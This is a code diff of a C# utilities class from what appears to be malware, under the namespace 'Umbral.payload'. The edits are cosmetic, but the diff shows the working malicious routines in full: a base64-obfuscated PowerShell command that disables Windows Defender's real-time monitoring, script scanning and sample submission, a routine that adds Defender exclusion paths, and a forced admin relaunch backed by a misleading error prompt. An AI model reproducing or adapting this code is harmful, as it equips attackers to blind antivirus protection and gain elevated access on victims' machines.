@@ -1,5 +1,4 @@
 ﻿using System;
-using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
@@ -14,10 +13,10 @@ namespace Umbral.payload.Utilities
 {
     internal static class Syscalls
     {
-        private static Mutex _mutex;
+        static private Mutex _mutex;
 
         [DllImport("kernel32.dll")]
-        private static extern IntPtr GetConsoleWindow();
+        static extern private IntPtr GetConsoleWindow();
 
         internal static bool IsConsoleVisible()
         {
@@ -27,7 +26,7 @@ namespace Umbral.payload.Utilities
         internal static bool DefenderExclude(string path)
         {
             if (File.Exists(path) || Directory.Exists(path))
-                using (var process = new Process())
+                using (Process process = new Process())
                 {
                     process.StartInfo.FileName = "powershell.exe";
                     process.StartInfo.Arguments = $"Add-MpPreference -ExclusionPath '{path}'";
@@ -43,9 +42,9 @@ namespace Umbral.payload.Utilities
 
         internal static bool DisableDefender()
         {
-            var command = Encoding.UTF8.GetString(Convert.FromBase64String(
+            string command = Encoding.UTF8.GetString(Convert.FromBase64String(
                 "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAy"));
-            using (var process = new Process())
+            using (Process process = new Process())
             {
                 process.StartInfo.FileName = "powershell.exe";
                 process.StartInfo.Arguments = command;
@@ -59,9 +58,9 @@ namespace Umbral.payload.Utilities
 
         internal static bool CheckAdminPrivileges()
         {
-            using (var identity = WindowsIdentity.GetCurrent())
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
             {
-                var principal = new WindowsPrincipal(identity);
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
                 return principal.IsInRole(WindowsBuiltInRole.Administrator);
             }
         }
@@ -70,7 +69,7 @@ namespace Umbral.payload.Utilities
         {
             if (!CheckAdminPrivileges())
             {
-                using (var process = new Process())
+                using (Process process = new Process())
                 {
                     process.StartInfo.FileName = Assembly.GetExecutingAssembly().Location;
                     process.StartInfo.Verb = "runas";
@@ -79,9 +78,9 @@ namespace Umbral.payload.Utilities
                     {
                         process.Start();
                     }
-                    catch (Exception )
+                    catch (Exception)
                     {
-                        var result = MessageBox.Show(
+                        DialogResult result = MessageBox.Show(
                             "This application requires administrative permissions to run correctly. Please restart the application with administrative permissions.",
                             "Error", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                         if (result == DialogResult.Yes)
@@ -102,7 +101,7 @@ namespace Umbral.payload.Utilities
 
         internal static void RegisterMutex()
         {
-            _mutex = new Mutex(true, Settings.Mutex, out var createdNew);
+            _mutex = new Mutex(true, Settings.Mutex, out bool createdNew);
 
             if (!createdNew)
             {
